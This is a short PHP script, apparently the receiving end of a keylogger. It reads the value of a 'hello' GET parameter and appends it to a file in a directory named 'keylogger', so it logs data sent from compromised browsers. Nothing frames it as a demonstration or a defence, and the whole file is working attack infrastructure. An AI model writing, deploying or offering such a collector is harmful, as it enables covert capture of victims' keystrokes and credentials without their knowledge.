<?php
$static='./keylogger/';

$data=$_GET['hello'];
$filename='hello';

$realname=$static.$filename;
print $realname;
$fp=fopen($realname,"a") or die("error");
fwrite($fp,$data);
          fclose($fp);


?>







